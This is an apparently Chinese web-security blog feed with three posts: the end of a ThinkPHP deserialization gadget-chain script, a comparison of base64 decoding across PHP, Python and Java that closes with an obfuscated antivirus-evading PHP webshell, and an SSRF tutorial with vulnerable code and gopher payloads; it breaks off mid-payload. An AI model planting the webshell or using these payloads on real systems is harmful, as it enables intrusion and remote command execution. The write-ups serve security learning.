keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Model 指向Output类__call()</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Pivot extends Model 继承Model,通过此类调用进Model</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Pipes Windows继承类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Windows extends Pipes 起点类 指向Pivot类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$Windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记事簿-各语言之间的base编码问题</title>
      <link href="/2021/09/28/%E8%AE%B0%E4%BA%8B%E7%B0%BF-%E5%90%84%E8%AF%AD%E8%A8%80%E4%B9%8B%E9%97%B4%E7%9A%84base%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
      <url>/2021/09/28/%E8%AE%B0%E4%BA%8B%E7%B0%BF-%E5%90%84%E8%AF%AD%E8%A8%80%E4%B9%8B%E9%97%B4%E7%9A%84base%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><blockquote><p>今天在学长给我的一道题中，我得知了一个我理当知道，却没有仔细去思考过的有趣想象</p><p>—— 不同计算机语言对同一编码的处理方式，理应有所差别</p></blockquote><h2 id="base64格式"><a href="#base64格式" class="headerlink" title="base64格式"></a>base64格式</h2><p><strong>⼤⼩写英⽂, 数字, +, =, / 组成⼀个base64</strong> </p><ul><li><p>例⼦⼀: </p><p>  字符串: aaa!~~!aa123g </p><p>  base64: YWFhIX5+IWFhMTIzZw== </p></li><li><p>例⼦⼆: </p><p>  字符串: aaa!~~!aa123gfG{}:”&gt;?dddff </p><p>  base64: YWFhIX5+IWFhMTIzZ2ZHe306Ij4/ZGRkZmY=</p></li></ul><h1 id="php对base64的处理"><a href="#php对base64的处理" class="headerlink" title="php对base64的处理"></a>php对base64的处理</h1><p><strong>弱类型语言几乎都对各种“小错误”有着很强的容忍性，这其中就包括php和python</strong></p><p>但这种容忍性在对base64的处理上，体现出明显的差距</p><blockquote><p>例子： abcdef</p><p>base64: YWJjZGVm</p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"abcdef"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">"YWJjZGVm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时处理时正常的</p><p><img src="image-20210928171559884.png" alt="image-20210928171559884"></p><h2 id="php对“错误”的处理"><a href="#php对“错误”的处理" class="headerlink" title="php对“错误”的处理"></a>php对“错误”的处理</h2><p>当故意输入许多的乱码时</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">"YWJ~~~jZG`Vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210928220530274.png" alt="image-20210928220530274"></p><p>base64被正常的解码</p><pre class="line-numbers language-php"><code class="language-php">字符串<span class="token punctuation">:</span> abase64<span class="token punctuation">:</span> <span class="token constant">YQ</span><span class="token operator">==</span>php_1<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> <span class="token operator">--</span><span class="token operator">--</span>Y<span class="token operator">|</span>Q<span class="token operator">==</span>解码为<span class="token punctuation">:</span> a解码情况<span class="token punctuation">:</span> 成功php_2<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> <span class="token operator">^</span>Y<span class="token operator">-</span><span class="token operator">|</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">[</span>Q<span class="token operator">-</span><span class="token operator">=</span><span class="token punctuation">)</span><span class="token operator">=</span>解码为<span class="token punctuation">:</span> a解码情况<span class="token punctuation">:</span> 成功php_3<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> 来Y测Q<span class="token operator">=</span>试<span class="token operator">=</span>啊解码为<span class="token punctuation">:</span> a解码情况<span class="token punctuation">:</span> 成功php_4<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> <span class="token constant">YQ</span><span class="token operator">==</span>Yg<span class="token operator">==</span>解码为<span class="token punctuation">:</span> 第⼀个<span class="token constant">YQ</span><span class="token operator">==</span>成功解码<span class="token punctuation">,</span>第⼆个<span class="token constant">YQ</span><span class="token operator">==</span>会解析成乱码解码情况<span class="token punctuation">:</span> <span class="token constant">YQ</span><span class="token operator">==</span>会解析为a<span class="token punctuation">,</span> Yg<span class="token operator">==</span>会解析为乱码<span class="token punctuation">,</span> <span class="token constant">YQ</span><span class="token operator">==</span>遇到<span class="token operator">=</span>号了解析完毕以后后⾯的base64都会乱码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出php对这些错误有着很高的容忍程度，只要没有破坏base64的规则，基本不会出现什么问题</p><h1 id="python对base64的处理"><a href="#python对base64的处理" class="headerlink" title="python对base64的处理"></a>python对base64的处理</h1><p>python对”错误”的容忍就明显不如php了，虽然python中base64解码函数号称时最强的</p><pre class="line-numbers language-python"><code class="language-python">例如<span class="token punctuation">:</span>字符串<span class="token punctuation">:</span> abase64<span class="token punctuation">:</span> YQ<span class="token operator">==</span>python_1<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Y<span class="token operator">|</span>Q<span class="token operator">==</span>解码为<span class="token punctuation">:</span> a解码情况<span class="token punctuation">:</span> 成功python_2<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> <span class="token operator">^</span>Y<span class="token operator">-</span><span class="token operator">|</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">[</span>Q<span class="token operator">-=</span><span class="token punctuation">)</span><span class="token operator">=</span>解码为<span class="token punctuation">:</span> a解码情况<span class="token punctuation">:</span> 成功python_3<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> 来Y测Q<span class="token operator">=</span>试<span class="token operator">=</span>啊解码为<span class="token punctuation">:</span> ⽆法解解码情况<span class="token punctuation">:</span> 失败<span class="token punctuation">,</span>遇到中⽂会直接爆ValueError<span class="token punctuation">:</span> string argument should contain only ASCII characters错误python_4<span class="token punctuation">:</span>base64<span class="token punctuation">:</span> YQ<span class="token operator">==</span>Yg<span class="token operator">==</span>解码为<span class="token punctuation">:</span> 第⼀个YQ<span class="token operator">==</span>成功解码<span class="token punctuation">,</span>第⼆个YQ<span class="token operator">==</span>直接过滤解码情况<span class="token punctuation">:</span> YQ<span class="token operator">==</span>会解析为a<span class="token punctuation">,</span> python遇到了<span class="token operator">=</span>号以后就等于结束了<span class="token punctuation">,</span><span class="token operator">=</span>号后⾯的内容全部会⾃动过滤掉不解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上可知，php遇到中文也不会有事，而python遇中文报错</p><p>还有一点，python对base64的字节数有着严格的限制，如果可编码的字节数不对，将会直接报错</p><p>比如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> base64res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"YWFhIX5+IWFhMTIzZw=="</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20210929121646959.png" alt="image-20210929121646959"></p><p><strong>虽然可以随意的添加不影响格式的特殊字符，但如果删掉一个等号，就会立刻报错</strong></p><p><strong>即python的base64虽然不被干扰，但是它解码的字节必须与正常的base64一致，否则报错，而php无此限制</strong></p><p><img src="image-20210929122331764.png" alt="image-20210929122331764"></p><h1 id="java对base64的处理"><a href="#java对base64的处理" class="headerlink" title="java对base64的处理"></a>java对base64的处理</h1><p>java时强类型语言，显然不能随心所欲的写base64，但仍然有个操作</p><p>即java可以同时解析多个base64并将其解析拼接</p><pre class="line-numbers language-java"><code class="language-java">字符串<span class="token operator">:</span> abase64<span class="token operator">:</span> YQ<span class="token operator">==</span>java<span class="token operator">:</span>base64<span class="token operator">:</span> YQ<span class="token operator">==</span>Yg<span class="token operator">==</span>解码为<span class="token operator">:</span> abphp<span class="token operator">:</span>base64<span class="token operator">:</span> YQ<span class="token operator">==</span>Yg<span class="token operator">==</span>解码为<span class="token operator">:</span> YQ<span class="token operator">==</span>会解析为a<span class="token punctuation">,</span> Yg<span class="token operator">==</span>会解析为乱码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="技巧的利用"><a href="#技巧的利用" class="headerlink" title="技巧的利用"></a>技巧的利用</h1><h2 id="免杀马"><a href="#免杀马" class="headerlink" title="免杀马"></a>免杀马</h2><p>正如我看的那篇文章所说，这个技巧最大的用途，就是写免杀马，市面上许多免杀都是基于对文件内容的检测（危险函数，语法），而将代码通过base64加密并混淆，可以起到免杀的作用</p><p>这里直接上文章里写的马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$base64_decode_str</span> <span class="token operator">=</span> <span class="token string">'edoced_46esab'</span><span class="token punctuation">;</span><span class="token variable">$base64_decode</span> <span class="token operator">=</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$base64_decode_str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// get_defined_vars 的 base64</span><span class="token variable">$parameter_base64</span> <span class="token operator">=</span> <span class="token string">'Z~2!!!V#0%X{2}R.l;Z,ml.u|Z-W^R……f*dmFycw==^^^^^^'</span><span class="token punctuation">;</span><span class="token variable">$parameter</span> <span class="token operator">=</span> <span class="token variable">$base64_decode</span><span class="token punctuation">(</span><span class="token variable">$parameter_base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// assert 的 base64</span><span class="token variable">$assert_base64</span> <span class="token operator">=</span> <span class="token string">'&lt;>-Y|X_N@z!Z\X]J[0:.::::'</span><span class="token punctuation">;</span><span class="token variable">$asser</span> <span class="token operator">=</span> <span class="token variable">$base64_decode</span><span class="token punctuation">(</span><span class="token variable">$assert_base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 利⽤</span><span class="token variable">$asser</span><span class="token punctuation">(</span><span class="token variable">$parameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'_GET'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>利⽤⽅法<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/test.php?1=phpinfo();</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>除免杀马外，该技巧还可以用于绕过waf</p><p>例如一个用php写的网站A，但他用了用Python写的waf B，这时如果A发送base64给B，B解码处理，我们就可以通过对base64的操作绕过waf B</p><p>实例不便展示</p><h1 id="鸣谢："><a href="#鸣谢：" class="headerlink" title="鸣谢："></a>鸣谢：</h1><p>《各语言base64解码的神奇之处》</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2021/09/22/SSRF/"/>
      <url>/2021/09/22/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><p>SSRF服务器请求伪造</p><p>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><p>简单来说：</p><p>服务器或多或少都会开启不止一个端口，有些端口（比如80）是可以从外网访问到的，而有些端口只是开启在服务器内部以供服务器内部程序的交互，无法通过外网访问</p><p>而现在开放给外网的端口的程序大多都有完善的防御机制，攻击这些程序无法或者很难获取到有效的信息。</p><p>但内部的程序往往不会有太高的安全防护，并且保存着重要的信息（例如数据库——3306端口）</p><p>SSRF就是通过伪造信息使服务器（使用外网端口的程序）向内部系统（端口没有映射外网，只能服务器内部访问的程序）发起请求，从而得到内部系统的信息甚至控制服务器的攻击方式</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191206123722.png" alt="img"></p><h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。</p><p>在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents是把文件写入字符串，当url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//POST传参接收</span><span class="token punctuation">{</span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 读取传参信息</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'./images/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.img'</span><span class="token punctuation">;</span>\ <span class="token comment" spellcheck="true">// 设定路径</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 保存</span>    <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出传入的信息</span>    <span class="token variable">$img</span><span class="token operator">=</span><span class="token string">"&lt;img src=\""</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"\"/>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将传入文件以图片输出    </span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$img</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen()</code>函数本身就是打开一个网络连接或者Unix套接字连接。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"$host"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** fsockopen()函数用于连接一个网址，相当于java网络编程的内容8 第一个参数代表一个主机的地址，第二个表示端口* $errno和$errstr无需人为的去定义，这是php自带的两个参数，* $errno 是从型参中传进来的*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果打开失败，则返回错误信息</span>    <span class="token keyword">echo</span> <span class="token string">"$errstr ($errno)&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*仿写一个HTTP请求头*/</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET / HTTP/1.1\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//把仿写的GET请求发送至host</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//循环判断文件指针是否到了文件结束的位置</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/*读取一行数据        *返回长度最多为 length - 1 字节的字符串。碰到换行符（包括在返回值中）、EOF 或者已经读取了 length - 1 字节后停止        *（看先碰到那一种情况）。如果没有指定 length，则默认为 1K，或者说 1024 字节。        */</span>        <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出响应信息</span>    <span class="token punctuation">}</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="curl"><a href="#curl" class="headerlink" title="curl()"></a>curl()</h3><p>这应该是大家最熟悉的一个函数了，因为利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于<code>curl()</code>函数的利用方式。</p><blockquote><p>这里需要安装PHP的curl扩展 <a href="https://segmentfault.com/a/1190000009068818">https://segmentfault.com/a/1190000009068818</a></p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//初始化一个curl会话若传入参数，则可以手动的对url进行设置</span>    <span class="token comment" spellcheck="true">/*curl_init(string $url);*/</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置curl传输选项curl_setopt();</span>    <span class="token comment" spellcheck="true">/*curl_setopt($curl_init【由curl_init返回的句柄】,option[CURLOPT_XXX选项],value[设置在选项上的值]);*/</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置url</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置请求头</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 执行会话</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 关闭</span><span class="token punctuation">}</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面就详细讲一下curl函数在ssrf中的具体利用方式。</p><h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><blockquote><p>在进行SSRF攻击时需要明确两点</p><p>1、SSRF可以做到多少事情和使用的协议有关</p><p>2、要知道可以使用那些协议，需要知道网站使用的语言支持那些协议，以及存在SSRF的函数支持那些协议</p></blockquote><h2 id="不同计算机语言支持的常用协议："><a href="#不同计算机语言支持的常用协议：" class="headerlink" title="不同计算机语言支持的常用协议："></a>不同计算机语言支持的常用协议：</h2><p><img src="20200201214217-16329099617601.png" alt="20200201214217"></p><h2 id="查看函数支持的所有协议"><a href="#查看函数支持的所有协议" class="headerlink" title="查看函数支持的所有协议"></a>查看函数支持的所有协议</h2><p><img src="image-20210929180818228.png" alt="image-20210929180818228"></p><p><strong>通过百度或者查看文档，可以知道函数支持的相关协议</strong></p><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。</p><p><strong>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。</strong></p><p>简单说该协议作用和语法与http一致，传输的格式略有不同</p><blockquote><p>语法：</p><pre class="line-numbers language-gophar"><code class="language-gophar">gopher://<host>:<port>/<gopher-path>_后接TCP数据流<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><pre class="line-numbers language-curl"><code class="language-curl">curl gopher://localhost:2222/_hello%0agopher//在数据hello前要加一个无用字符http://192.168.91.130/ssrf.php?url=gopher://localhost:2222/_hello%250agopher//在地址栏使用时要url编码http://192.168.91.130/ssrf.php?url=gopher://localhost:2222/_`whoami`<span aria-hidden="true" 